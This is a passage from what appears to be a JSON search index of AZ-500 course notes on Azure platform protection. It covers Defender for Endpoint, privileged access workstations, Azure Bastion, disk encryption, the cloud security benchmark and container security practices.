remediation of endpoint vulnerabilities and misconfigurations.</p> <p>Attack surface reduction - The attack surface reduction set of capabilities provides the first line of defense in the stack. By ensuring configuration settings are properly set and exploit mitigation techniques are applied, the capabilities resist attacks and exploitation. This set of capabilities also includes network protection and web protection, which regulate access to malicious IP addresses, domains, and URLs.</p> <p>Next-generation protection - To further reinforce the security perimeter of your network, Microsoft Defender for Endpoint uses next-generation protection designed to catch all types of emerging threats.</p> <p>Endpoint detection and response - Endpoint detection and response capabilities are put in place to detect, investigate, and respond to advanced threats that may have made it past the first two security pillars.  Advanced hunting provides a query-based threat-hunting tool that lets you proactively find breaches and create custom detections.</p> <p>Automated investigation and remediation - In conjunction with being able to quickly respond to advanced attacks, Microsoft Defender for Endpoint offers automatic investigation and remediation capabilities that help reduce the volume of alerts in minutes at scale.</p> <p>Microsoft Secure Score for Devices - Defender for Endpoint includes Microsoft Secure Score for Devices to help you dynamically assess the security state of your enterprise network, identify unprotected systems, and take recommended actions to improve the overall security of your organization.</p> <p>Microsoft Threat Experts - Microsoft Defender for Endpoint's new managed threat hunting service provides proactive hunting, prioritization, and additional context and insights that further empower Security operation centers (SOCs) to identify and respond to threats quickly and accurately.</p> <p>Defender for Endpoint customers need to apply for the Microsoft Threat Experts managed threat hunting service to get proactive Targeted Attack Notifications and to collaborate with experts on demand.</p> <p>Centralized configuration and administration, APIs - Integrate Microsoft Defender for Endpoint into your existing workflows.</p> <p>Integration with Microsoft solutions - Defender for Endpoint directly integrates with various Microsoft solutions, including:</p> <ul> <li>Microsoft Defender for Cloud</li> <li>Microsoft Sentinel</li> <li>Intune</li> <li>Microsoft Defender for Cloud Apps</li> <li>Microsoft Defender for Identity</li> <li>Microsoft Defender for Office</li> <li>Skype for Business</li> </ul> <p>Microsoft 365 Defender - With Microsoft 365 Defender, Defender for Endpoint, and various Microsoft security solutions, form a unified pre- and post-breach enterprise defense suite that natively integrates across endpoint, identity, email, and applications to detect, prevent, investigate, and automatically respond to sophisticated attack</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#32-privileged-access-device","title":"3.2. Privileged Access Device","text":"<p>Zero Trust, means that you don't purchase from generic retailers but only supply hardware from an authorized OEM that support Autopilot.</p> <p>For this solution, root of trust will be deployed using Windows Autopilot technology with hardware that meets the modern technical requirements. To secure a workstation, Autopilot lets you leverage Microsoft OEM-optimized Windows 10 devices. These devices come in a known good state from the manufacturer. Instead of reimaging a potentially insecure device, Autopilot can transform a Windows 10 device into a \u201cbusiness-ready\u201d state. It applies settings and policies, installs apps, and even changes the edition of Windows 10.</p> <p>To have a secured workstation you need to make sure the following security technologies are included on the device:</p> <ul> <li>Trusted Platform Module (TPM) 2.0</li> <li>BitLocker Drive Encryption</li> <li>UEFI Secure Boot</li> <li>Drivers and Firmware Distributed through Windows Update</li> <li>Virtualization and HVCI Enabled</li> <li>Drivers and Apps HVCI-Ready</li> <li>Windows Hello</li> <li>DMA I/O Protection</li> <li>System Guard</li> <li>Modern Standby</li> </ul> <p>Levels of device security</p> Device Type Common usage scenario Permitted activities Security guidance Enterprise Device Home users, small business users, general purpose developers, and enterprise Run any application, browse any website Anti-malware and virus protection and policy based security posture for the enterprise. Specialized Device Specialized or secure enterprise users Run approved applications, but cannot install apps. Email and web browsing allowed. No admin controls No self administration of device, no application installation, policy based security, and endpoint management Privileged Device Extremely sensitive roles IT Operations No local admins, no productivity tools, locked down browsing. PAW device <p>This chart shows the level of device security controls based on how the device will be used.</p> <p></p> <p>A secure workstation requires it be part of an end-to-end approach including device security, account security, and security policies applied to the device at all times. Here are some common security measures you should consider implementing based on the users' needs.</p> Security Control Enterprise Device Specialized Device Privileged Device Microsoft Endpoint Manager (MEM) managed Yes Yes Yes Deny BYOD Device enrollment No Yes Yes MEM security baseline applied Yes Yes Yes Microsoft Defender for Endpoint Yes Yes Yes Join personal device via Autopilot Yes Yes No URLs restricted to approved list Allow Most Allow Most Deny Default Removal of admin rights Yes Yes Application execution control (AppLocker) Audit -&gt; Enforced Yes Applications installed only by MEM Yes Yes","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#33-privileged-access-workstations-paw-workstations","title":"3.3. Privileged Access Workstations (PAW workstations)","text":"<p>PAW is a hardened and locked down workstation designed to provide high security assurances for sensitive accounts and tasks. PAWs are recommended for administration of identity systems, cloud services, and private cloud fabric as well as sensitive business functions. In order to provide the greatest security, PAWs should always run the most up-to-date and secure operating system available: Microsoft strongly recommends Windows 10 Enterprise, which includes several additional security features not available in other editions (in particular, Credential Guard and Device Guard).</p> <ul> <li>Internet attacks\u00a0- Isolating the PAW from the open internet is a key element to ensuring the PAW is not compromised.</li> <li>Usability risk\u00a0- If a PAW is too difficult to use for daily tasks, administrators will be motivated to create workarounds to make their jobs easier.</li> <li>Environment risks\u00a0- Minimizing the use of management tools and accounts that have access to the PAWs to secure and monitor these specialized workstations.</li> <li>Supply chain tampering\u00a0- Taking a few key actions can mitigate critical attack vectors that are readily available to attackers. This includes validating the integrity of all installation media (Clean Source Principle) and using a trusted and reputable supplier for hardware and software.</li> <li>Physical attacks\u00a0- Because PAWs can be physically mobile and used outside of physically secure facilities, they must be protected against attacks that leverage unauthorized physical access to the computer.</li> </ul> <p>This methodology is appropriate for accounts with access to high value assets:</p> <ul> <li>Administrative Privileges\u00a0- PAWs provide increased security for high impact IT administrative roles and tasks. This architecture can be applied to administration of many types of systems including Active Directory Domains and Forests, Microsoft Entra tenants, Microsoft 365 tenants, Process Control Networks (PCN), Supervisory Control and Data Acquisition (SCADA) systems, Automated Teller Machines (ATMs), and Point of Sale (PoS) devices.</li> <li>High Sensitivity Information workers\u00a0- The approach used in a PAW can also provide protection for highly sensitive information worker tasks and personnel such as those involving pre-announcement Merger and Acquisition activity, pre-release financial reports, organizational social media presence, executive communications, unpatented trade secrets, sensitive research, or other proprietary or sensitive data. This guidance does not discuss the configuration of these information worker scenarios in depth or include this scenario in the technical instructions.</li> </ul> <p>Administrative \"Jump Box\" architectures set up a small number administrative console servers and restrict personnel to using them for administrative tasks. This is typically based on remote desktop services, a 3rd-party presentation virtualization solution, or a Virtual Desktop Infrastructure (VDI) technology.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#34-virtual-machine-templates","title":"3.4. Virtual Machine templates","text":"<p>Here are some additional terms to know when using Resource Manager:</p> <ul> <li>Resource provider. A service that supplies Azure resources. For example, a common resource provider is Microsoft.Compute, which supplies the VM resource. Microsoft.Storage is another common resource provider.</li> <li>Resource Manager template. A JSON file that defines one or more resources to deploy to a resource group or subscription. You can use the template to consistently and repeatedly deploy the resources.</li> <li>Declarative syntax. Syntax that lets you state, \"Here\u2019s what I intend to create\" without having to write the sequence of programming commands to create it. The Resource Manager template is an example of declarative syntax. In the file, you define the properties for the infrastructure to deploy to Azure.</li> </ul> <p>When you deploy a template, Resource Manager converts the template into REST API operations.</p> <p>Here two different deployment schemas with same result:</p> <p></p> <p></p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#35-remote-access-management-rdp-ssh-and-azure-bastion","title":"3.5. Remote Access Management: RDP, ssh, and Azure Bastion","text":"<p>This topic explains how to connect to and sign into the virtual machines (VMs) you created on Azure. Once you've successfully connected, you can work with the VM as if you were locally logged on to its host server.</p> <p>Connect to a Windows VM - With rdp, with ssh or with Azure Bastion Service. The Azure Bastion service is a fully platform-managed PaaS service that you provision inside your virtual network. It provides secure and seamless RDP/SSH connectivity to your virtual machines directly in the Azure portal over TLS. The Azure Bastion service is a fully platform-managed PaaS service that you provision inside your virtual network. It provides secure and seamless RDP/SSH connectivity to your virtual machines directly in the Azure portal over TLS. Bastion provides secure RDP and SSH connectivity to all the VMs in the virtual network in which it is provisioned. Using Azure Bastion protects your virtual machines from exposing RDP/SSH ports to the outside world, while still providing secure access using RDP/SSH. With Azure Bastion, you connect to the virtual machine directly from the Azure portal.</p> <p></p> <p>Benefits of Bastion</p> <p>You can deploy bastion hosts (also known as jump-servers) at the public side of your perimeter network. Bastion host servers are designed and configured to withstand attacks. Bastion servers also provide RDP and SSH connectivity to the workloads sitting behind the bastion, as well as further inside the network.</p> <p>No hassle of managing NSGs: Azure Bastion is a fully managed platform PaaS service from Azure that is hardened internally to provide you secure RDP/SSH connectivity. You don't need to apply any NSGs on Azure Bastion subnet. Because Azure Bastion connects to your virtual machines over private IP, you can configure your NSGs to allow RDP/SSH from Azure Bastion only.</p> <p>Protection against port scanning: Because you do not need to expose your virtual machines to public Internet, your VMs are protected against port scanning by rogue and malicious users located outside your virtual network.</p> <p>Protect against zero-day exploits. Hardening in one place only: Azure Bastion is a fully platform-managed PaaS service. Because it sits at the perimeter of your virtual network, you don\u2019t need to worry about hardening each of the virtual machines in your virtual network.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#36-update-management","title":"3.6. Update Management","text":"<p>Azure Update Management is a service included as part of your Azure subscription. With Update Management, you can assess your update status across your environment and manage your Windows Server and Linux server updates from a single location\u2014for both your on-premises and Azure environments.</p> <p>Update Management is available at no additional cost (you pay only for the log data that Azure Log Analytics stores), and you can easily enable it for Azure and on-premises VMs. \u00a0You can also enable Update Management for VMs directly from your Azure Automation account.</p> <p>Configurations on managed computers:</p> <ul> <li>Microsoft Monitoring Agent (MMA) for Windows or Linux.</li> <li>Desired State Configuration (DSC) in Windows PowerShell for Linux.</li> <li>Hybrid Runbook Worker in Azure Automation.</li> <li>Microsoft Update or Windows Server Update Services (WSUS) for Windows computers.</li> </ul> <p>Azure Automation uses runbooks to install updates. When an update deployment is created, it creates a schedule that starts a master update runbook at the specified time for the included computers. The master runbook starts a child runbook on each agent to install the required updates.</p> <p>The Log Analytics agent for Windows and Linux needs to be installed on the VMs that are running on your corporate network or other cloud environment in order to enable them with Update Management.</p> <p>From your Azure Automation account, you can:</p> <ul> <li>Onboard virtual machines</li> <li>Assess the status of available updates</li> <li>Schedule installation of required updates</li> <li>Review deployment results to verify that updates were applied successfully to all virtual machines for which Update Management is enabled</li> </ul> <p>Azure Update Management provides the ability to deploy patches based on classifications. However, there are scenarios where you may want to explicitly list the exact set of patches. With update inclusion lists you can choose exactly which patches you want to deploy instead of relying on patch classifications.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#37-disk-encryption","title":"3.7. Disk encryption","text":"","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#windows","title":"WINDOWS","text":"<p>Azure Disk Encryption for Windows VMs\u00a0helps protect and safeguard your data to meet your organizational security and compliance commitments. It uses the BitLocker feature of Windows to provide volume encryption for the OS and data disks of Azure virtual machines (VMs), and is integrated with Azure Key Vault to help you control and manage the disk encryption keys and secrets. Azure Disk Encryption is zone resilient, the same way as Virtual Machines.</p> <p>Supported VMs. -  Azure Disk Encryption is supported on Generation 1 and Generation 2 VMs. Azure Disk Encryption is also available for VMs with premium storage. Azure Disk Encryption is not available on Basic, A-series VMs, or on virtual machines with less than 2 GB of memory.</p> <p>Supported operating systems. - - Windows client: Windows 8 and later. - Windows Server: Windows Server 2008 R2 and later. - Windows 10 Enterprise multi-session.</p> <p>To enable Azure Disk Encryption, the VMs must meet the following network endpoint configuration requirements:</p> <ul> <li>To get a token to connect to your key vault, the Windows VM must be able to connect to a Microsoft Entra endpoint, [login.microsoftonline.com].</li> <li>To write the encryption keys to your key vault, the Windows VM must be able to connect to the key vault endpoint.</li> <li>The Windows VM must be able to connect to an Azure storage endpoint that hosts the Azure extension repository and an Azure storage account that hosts the VHD files.</li> <li>If your security policy limits access from Azure VMs to the Internet, you can resolve the preceding URI and configure a specific rule to allow outbound connectivity to the IPs.</li> </ul> <p>Group Policy requirements. - Azure Disk Encryption uses the BitLocker external key protector for Windows VMs. For domain joined VMs, don't push any group policies that enforce TPM protectors. BitLocker policy on domain joined virtual machines with custom group policy must include the following setting: Configure user storage of BitLocker recovery information -&gt; Allow 256-bit recovery key. Azure Disk Encryption will fail when custom group policy settings for BitLocker are incompatible. On machines that didn't have the correct policy setting, apply the new policy, force the new policy to update (gpupdate.exe /force), and then restarting may be required. Azure Disk Encryption will fail if domain level group policy blocks the AES-CBC algorithm, which is used by BitLocker.</p> <p>Encryption key storage requirements. - Azure Disk Encryption requires an Azure Key Vault to control and manage disk encryption keys and secrets. Your key vault and VMs must reside in the same Azure region and subscription.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#linux","title":"LINUX","text":"<p>Supported VMs. - \u00a0Azure Disk Encryption is supported on Generation 1 and Generation 2 VMs. Azure Disk Encryption is also available for VMs with premium storage.</p> <p>Note:\u00a0Azure Disk Encryption is not available on Basic, A-series VMs, or on virtual machines that do not meet these minimum memory requirements:</p> Virtual machine Minimum memory requirement Linux VMs when only encrypting data volumes 2 GB Linux VMs when encrypting both data and OS volumes, and where the root (/) file system usage is 4GB or less 8 GB Linux VMs when encrypting both data and OS volumes, and where the root (/) file system usage is greater than 4GB The root file system usage * 2. For instance, a 16 GB of root file system usage requires at least 32GB of RAM <p>Once the OS disk encryption process is complete on Linux virtual machines, the VM can be configured to run with less memory.</p> <p>Azure Disk Encryption requires the dm-crypt and\u00a0<code>vfat</code>\u00a0modules to be present on the system. Removing or disabling\u00a0<code>vfat</code>\u00a0from the default image will prevent the system from reading the key volume and obtaining the key needed to unlock the disks on subsequent reboots. System hardening steps that remove the vfat module from the system are not compatible with Azure Disk Encryption</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#38-managed-disk-encryption-options","title":"3.8. Managed disk encryption options","text":"<p>There are several types of encryption available for your managed disks, including Azure Disk Encryption (ADE), Server-Side Encryption (SSE), and encryption at the host.</p> <p>Azure Disk Encryption helps protect and safeguard your data to meet organizational security and compliance commitments. ADE encrypts the OS and data disks of Azure virtual machines (VMs) inside your VMs by using the device mapper DM-Crypt feature of Linux or the BitLocker feature of Windows. Azure Disk Encryption (ADE) is integrated with Azure Key Vault to help you control and manage the disk encryption keys and secrets. Azure Disk Storage Server-Side Encryption (also referred to as encryption-at-rest or Azure Storage encryption) automatically encrypts data stored on Azure-managed disks (OS and data disks) when persisting on the Storage Clusters. When configured with a Disk Encryption Set (DES), it supports customer-managed keys as well. Encryption at the host ensures that data stored on the VM host hosting your VM is encrypted at rest and flows encrypted to the Storage clusters. Confidential disk encryption binds disk encryption keys to the virtual machine's TPM (Trusted Platform Module) and makes the protected disk content accessible only to the VM. The TPM and VM guest state is always encrypted in attested code using keys released by a secure protocol that bypasses the hypervisor and host operating system. Currently only available for the OS disk. Encryption at the host may be used for other disks on a Confidential VM in addition to Confidential Disk Encryption.</p> <p></p> <p>For\u00a0Encryption at the host\u00a0and\u00a0Confidential disk encryption, Microsoft Defender for Cloud does not detect the encryption state. We are in the process of updating Microsoft Defender.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#39-windows-defender","title":"3.9. Windows Defender","text":"<p>Windows 10, Windows Server 2019, and Windows Server 2016 include key security features. They are Windows Defender Credential Guard, Windows Defender Device Guard, and Windows Defender Application Control.</p> <ul> <li>Windows Defender Credential Guard: Introduced in Windows 10 Enterprise and Windows Server 2016, Windows Defender Credential Guard uses virtualization-based security enhancement to isolate secrets so that only privileged system software can access them. Unauthorized access to these secrets might lead to credential theft attacks, such as Pass-the-Hash or pass-the-ticket attacks. Windows Defender Credential Guard helps prevent these attacks by helping protect Integrated Windows Authentication (NTLM) password hashes, Kerberos authentication ticket-granting tickets, and credentials that applications store as domain credentials.</li> <li>Windows Defender Application Control: Windows Defender Application Control helps mitigate these types of threats by restricting the applications that users can run and the code that runs in the system core, or kernel. Policies in Windows Defender Application Control also block unsigned scripts and MSIs, and Windows PowerShell runs in Constrained language mode.</li> <li>Windows Defender Device Guard: Does this mean the Windows Defender Device Guard configuration state is going away? Not at all. The term device guard will continue to describe the fully locked down state achieved using Windows Defender Application Control, HVCI, and hardware and firmware security features. It will also allow Microsoft to work with its original equipment manufacturer (OEM) partners to identify specifications for devices that are device guard capable\u2014so that joint customers can easily purchase devices that meet all the hardware and firmware requirements of the original locked down scenario of Windows Defender Device Guard for Windows 10 devices.</li> </ul> <p>Microsoft Defender for Endpoint - Supported Operating Systems</p> <p></p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#310-microsoft-cloud-security-benchmark-in-defender-for-cloud","title":"3.10. Microsoft cloud security benchmark in Defender for Cloud","text":"<p>The\u00a0Microsoft cloud security benchmark (MCSB)\u00a0provides prescriptive best practices and recommendations to help\u00a0improve the security of workloads,\u00a0data, and\u00a0services\u00a0on\u00a0Azure\u00a0and your\u00a0multicloud environment. This benchmark focuses on\u00a0cloud-centric control areas\u00a0with input from a set of\u00a0holistic Microsoft\u00a0and\u00a0industry security guidance\u00a0that includes:</p> <ul> <li>Cloud Adoption Framework: Guidance on\u00a0security, including\u00a0strategy,\u00a0roles\u00a0and\u00a0responsibilities,\u00a0Azure Top 10 Security Best Practices, and\u00a0reference implementation.</li> <li>Azure Well-Architected Framework: Guidance on securing your workloads on Azure.</li> <li>The Chief Information Security Officer (CISO) Workshop: Program guidance and reference strategies to accelerate security modernization using Zero Trust principles.</li> <li>Other industry and cloud service provider's security best practice standards and framework: Examples include the Amazon Web Services (AWS) Well-Architected Framework, Center for Internet Security (CIS) Controls, National Institute of Standards and Technology (NIST), and Payment Card Industry Data Security Standard (PCI-DSS).</li> </ul> <p>The\u00a0Azure Security Benchmark (ASB)\u00a0at \u00a0Microsoft cloud security benchmark (MCSB) helps you quickly work with different clouds by:</p> <ul> <li>Providing a single control framework to easily meet the security controls across clouds</li> <li>Providing consistent user experience for monitoring and enforcing the multicloud security benchmark in Defender for Cloud</li> <li>Staying aligned with Industry Standards (e.g., Center for Internet Security, National Institute of Standards and Technology, Payment Card Industry)</li> </ul> <p>Automated control monitoring for AWS in Microsoft Defender for Cloud:\u00a0You can use\u00a0Microsoft Defender for Cloud Regulatory Compliance Dashboard\u00a0to monitor your AWS environment against\u00a0Microsoft cloud security benchmark (MCSB), just like how you monitor your Azure environment. We developed approximately\u00a0180 AWS checks\u00a0for the new AWS security guidance in MCSB, allowing you to monitor your AWS environment and resources in Microsoft Defender for Cloud.</p> <p>Some controls:</p> Control Domains Description Network security (NS) Network Security\u00a0covers controls to secure and protect networks, including securing virtual networks, establishing private connections, preventing and mitigating external attacks, and securing Domain Name System (DNS). Identity Management (IM) Identity Management\u00a0covers controls to establish a secure identity and access controls using identity and access management systems, including the use of single sign-on, strong authentications, managed identities (and service principals) for applications, conditional access, and account anomalies monitoring. Privileged Access (PA) Privileged Access\u00a0covers controls to protect privileged access to your tenant and resources, including a range of controls to protect your administrative model, administrative accounts, and privileged access workstations against deliberate and inadvertent risk. Data Protection (DP) Data Protection\u00a0covers control of data protection at rest, in transit, and via authorized access mechanisms, including discover, classify, protect, and monitoring sensitive data assets using access control, encryption, key management, and certificate management. Asset Management (AM) Asset Management\u00a0covers controls to ensure security visibility and governance over your resources, including recommendations on permissions for security personnel, security access to asset inventory and managing approvals for services and resources (inventory,\u00a0track, and\u00a0correct). Logging and Threat Detection (LT) Logging and Threat Detection\u00a0covers controls for detecting threats on the cloud and enabling, collecting, and storing audit logs for cloud services, including enabling detection, investigation, and remediation processes with controls to generate high-quality alerts with native threat detection in cloud services; it also includes collecting logs with a cloud monitoring service, centralizing security analysis with a\u00a0security event management (SEM), time synchronization, and log retention. Incident Response (IR) Incident Response\u00a0covers controls in the incident response life cycle - preparation, detection and analysis, containment, and post-incident activities, including using Azure services (such as Microsoft Defender for Cloud and Sentinel) and/or other cloud services to automate the incident response process. Posture and Vulnerability Management (PV) Posture and Vulnerability Management\u00a0focuses on controls for assessing and improving the cloud security posture, including vulnerability scanning, penetration testing, and remediation, as well as security configuration tracking, reporting, and correction in cloud resources. Endpoint Security (ES) Endpoint Security\u00a0covers controls in endpoint detection and response, including the use of endpoint detection and response (EDR) and anti-malware service for endpoints in cloud environments. Backup and Recovery (BR) Backup and Recovery\u00a0covers controls to ensure that data and configuration backups at the different service tiers are performed, validated, and protected. DevOps Security (DS) DevOps Security\u00a0covers the controls related to the security engineering and operations in the DevOps processes, including deployment of critical security checks (such as static application security testing and vulnerability management) prior to the deployment phase to ensure the security throughout the DevOps process; it also includes common topics such as threat modeling and software supply security. Governance and Strategy (GS) Governance and Strategy\u00a0provides guidance for ensuring a coherent security strategy and documented governance approach to guide and sustain security assurance, including establishing roles and responsibilities for the different cloud security functions, unified technical strategy, and supporting policies and standards.","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#311-microsoft-defender-for-cloud-recommendations","title":"3.11. Microsoft Defender for Cloud recommendations","text":"<p>Using the\u00a0policies, Defender for Cloud periodically analyzes the compliance status of your resources to identify potential security misconfigurations and weaknesses. It then provides you with recommendations on how to remediate those issues. Recommendations result from assessing your resources against the relevant policies and identifying resources that aren't meeting your defined requirements.</p> <p>Defender for Cloud\u00a0makes its security recommendations based on your chosen initiatives. When a policy from your initiative is compared against your resources and finds one or more that aren't compliant, it is presented as a recommendation in Defender for Cloud.</p> <p>Recommendations\u00a0are actions for you to take to secure and harden your resources. In practice, it works like this:</p> <p>1. Azure Security Benchmark is an\u00a0initiative\u00a0that contains requirements. For example, Azure Storage accounts must restrict network access to reduce their attack surface.</p> <p>2. The initiative includes multiple\u00a0policies, each requiring a specific resource type. These policies enforce the requirements in the initiative. To continue the example, the storage requirement is enforced with the policy \"Storage accounts should restrict network access using virtual network rules.\"</p> <p>3. Microsoft Defender for Cloud continually assesses your connected subscriptions. If it finds a resource that doesn't satisfy a policy, it displays a\u00a0recommendation\u00a0to fix that situation and harden the security of resources that aren't meeting your security requirements. For example, if an Azure Storage account on your protected subscriptions isn't protected with virtual network rules, you'll see the recommendation to harden those resources.</p> <p>So, (1)\u00a0an initiative includes\u00a0(2)\u00a0policies that generate\u00a0(3)\u00a0environment-specific recommendations.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#4-containers-security","title":"4. Containers security","text":"","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#41-containers","title":"4.1. Containers","text":"<p>A container is an isolated, lightweight silo for running an application on the host operating system. Containers build on top of the host operating system's kernel (which can be thought of as the buried plumbing of the operating system), and contain only apps and some lightweight operating system APIs and services that run in user mode. While a container shares the host operating system's kernel, the container doesn't get unfettered access to it. Instead, the container gets an isolated\u2013and in some cases virtualized\u2013view of the system. For example, a container can access a virtualized version of the file system and registry, but any changes affect only the container and are discarded when it stops. To save data, the container can mount persistent storage such as an Azure Disk or a file share (including Azure Files).</p> <p>You need\u00a0Docker\u00a0in order to work with Windows Containers. Docker consists of the Docker Engine (dockerd.exe), and the Docker client (docker.exe).</p> <p>How it works.-  A container builds on top of the kernel, but the kernel doesn't provide all of the APIs and services an app needs to run\u2013most of these are provided by system files (libraries) that run above the kernel in user mode. Because a container is isolated from the host's user mode environment, the container needs its own copy of these user mode system files, which are packaged into something known as a base image. The base image serves as the foundational layer upon which your container is built, providing it with operating system services not provided by the kernel.</p> <p></p> <p>Because containers require far fewer resources (for example, they don't need a full OS), they're easy to deploy and they start fast. This allows you to have higher density, meaning that it allows you to run more services on the same hardware unit, thereby reducing costs. As a side effect of running on the same kernel, you get less isolation than VMs.</p> <p>Features</p> <p>Isolation. - Typically provides lightweight isolation from the host and other containers, but doesn't provide as strong a security boundary as a VM. (You can increase the security by using Hyper-V isolation mode to isolate each container in a lightweight VM).</p> <p>Operating System. - Runs the user mode portion of an operating system, and can be tailored to contain just the needed services for your app, using fewer system resources.</p> <p>Deployment. - Deploy individual containers by using Docker via command line; deploy multiple containers by using an orchestrator such as Azure Kubernetes Service.</p> <p>Persistent storage. - Use Azure Disks for local storage for a single node, or Azure Files (SMB shares) for storage shared by multiple nodes or servers.</p> <p>Fault tolerance. - If a cluster node fails, any containers running on it are rapidly recreated by the orchestrator on another cluster node.</p> <p>Networking. - Uses an isolated view of a virtual network adapter, providing a little less virtualization\u2013the host's firewall is shared with containers\u2013while using less resources.</p> <p>In Docker, each layer is the resulting set of changes that happen to the filesystem after executing a command, such as, installing a program. So, when you view the filesystem after the layer has been copied, you can view all the files, including the layer when the program was installed. You can think of an image as an auxiliary read-only hard disk ready to be installed in a \"computer\" where the operating system is already installed. Similarly, you can think of a container as the \"computer\" with the image hard disk installed. The container, just like a computer, can be powered on or off.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#42-azure-container-instances-aci-security","title":"4.2. Azure Container Instances (ACI) security","text":"<p>There are many security recommendations for Azure Container Instances, use these to optimize your security for containers.</p> <p>Use a private registry: Containers are built from images that are stored in one or more repositories. These repositories can belong to a public registry, like Docker Hub, or to a private registry. An example of a private registry is the Docker Trusted Registry, which can be installed on-premises or in a virtual private cloud. You can also use cloud-based private container registry services, including Azure Container Registry. A publicly available container image does not guarantee security. Container images consist of multiple software layers, and each software layer might have vulnerabilities. To help reduce the threat of attacks, you should store and retrieve images from a private registry, such as Azure Container Registry or Docker Trusted Registry. In addition to providing a managed private registry, Azure Container Registry supports service principal-based authentication through Microsoft Entra ID for basic authentication flows. This authentication includes role-based access for read-only (pull), write (push), and other permissions.</p> <p>Monitor and scan container images continuously: Take advantage of solutions to scan container images in a private registry and identify potential vulnerabilities. It\u2019s important to understand the depth of threat detection that the different solutions provide. For example, Azure Container Registry optionally integrates with Microsoft Defender for Cloud to automatically scan all Linux images pushed to a registry. Microsoft Defender for Cloud integrated Qualys scanner detects image vulnerabilities, classifies them, and provides remediation guidance.</p> <p>Protect credentials: Containers can spread across several clusters and Azure regions. So, you must secure credentials required for logins or API access, such as passwords or tokens. Ensure that only privileged users can access those containers in transit and at rest. Inventory all credential secrets, and then require developers to use emerging secrets-management tools that are designed for container platforms. Make sure that your solution includes encrypted databases, TLS encryption for secrets data in transit, and least-privilege role-based access control. Azure Key Vault is a cloud service that safeguards encryption keys and secrets (such as certificates, connection strings, and passwords) for containerized applications. Because this data is sensitive and business critical, secure access to your key vaults so that only authorized applications and users can access them.</p> <p>Use vulnerability management as part of your container development lifecycle: By using effective vulnerability management throughout the container development lifecycle, you improve the odds that you identify and resolve security concerns before they become a more serious problem.</p> <p>Scan for vulnerabilities: New vulnerabilities are discovered all the time, so scanning for and identifying vulnerabilities is a continuous process. Incorporate vulnerability scanning throughout the container lifecycle:</p> <p>Ensure that only approved images are used in your environment: There\u2019s enough change and volatility in a container ecosystem without allowing unknown containers as well. Allow only approved container images. Have tools and processes in place to monitor for and prevent the use of unapproved container images. An effective way of reducing the attack surface and preventing developers from making critical security mistakes is to control the flow of container images into your development environment. Image signing or fingerprinting can provide a chain of custody that enables you to verify the integrity of the containers. For example, Azure Container Registry supports Docker's content trust model, which allows image publishers to sign images that are pushed to a registry, and image consumers to pull only signed images.</p> <p>Enforce least privileges in runtime: The concept of least privileges is a basic security best practice that also applies to containers. When a vulnerability is exploited, it generally gives the attacker access and privileges equal to those of the compromised application or process. Ensuring that containers operate with the lowest privileges and access required to get the job done reduces your exposure to risk.</p> <p>Reduce the container attack surface by removing unneeded privileges: You can also minimize the potential attack surface by removing any unused or unnecessary processes or privileges from the container runtime. Privileged containers run as root. If a malicious user or workload escapes in a privileged container, the container will then run as root on that system.</p> <p>Log all container administrative user access for auditing: Maintain an accurate audit trail of administrative access to your container ecosystem, including your Kubernetes cluster, container registry, and container images. These logs might be necessary for auditing purposes and will be useful as forensic evidence after any security incident. Azure solutions include:</p> <ul> <li>Integration of Azure Kubernetes Service with Microsoft Defender for Cloud to monitor the security configuration of the cluster environment and generate security recommendations</li> <li>Azure Container Monitoring solution</li> <li>Resource logs for Azure Container Instances and Azure Container Registry</li> </ul> <p>Container access</p> <ul> <li>Azure Container Instances enables exposing your container groups directly to the internet with an IP address and a fully qualified domain name (FQDN). When you create a container instance, you can specify a custom DNS name label so your application is reachable at customlabel.azureregion.azurecontainer.io.</li> <li>Azure Container Instances also supports executing a command in a running container by providing an interactive shell to help with application development and troubleshooting. Access takes places over HTTPS, using TLS to secure client connections.</li> </ul> <p>Container deployment: Deploy containers from DockerHub or Azure Container Registry.</p> <p>Hypervisor-level security:\u00a0Historically, containers have offered application dependency isolation and resource governance but have not been considered sufficiently hardened for hostile multi-tenant usage. Azure Container Instances guarantees your application is as isolated in a container as it would be in a VM.</p> <p>Custom sizes:\u00a0Containers are typically optimized to run just a single application, but the exact needs of those applications can differ greatly. Azure Container Instances provides optimum utilization by allowing exact specifications of CPU cores and memory. You pay based on what you need and get billed by the second, so you can fine-tune your spending based on actual need.</p> <p>Persistent storage: To retrieve and persist state with Azure Container Instances, we offer direct mounting of Azure Files shares backed by Azure Storage.</p> <p>Flexible billing: Supports per-GB, per-CPU, and per-second billing.</p> <p>Linux and Windows containers: \u00a0Azure Container Instances can schedule both Windows and Linux containers with the same API. Simply specify the OS type when you create your container groups. For Windows container deployments, use images based on common Windows base images. Some features are currently restricted to Linux containers:</p> <ul> <li>Multiple containers per container group</li> <li>Volume mounting (Azure Files, emptyDir, GitRepo, secret)</li> <li>Resource usage metrics with Azure Monitor</li> <li>Virtual network deployment</li> <li>GPU resources (preview)</li> </ul> <p>Co-scheduled groups: Azure Container Instances supports scheduling of multi-container groups that share a host machine, local network, storage, and lifecycle. This enables you to combine your main application container with other supporting role containers, such as 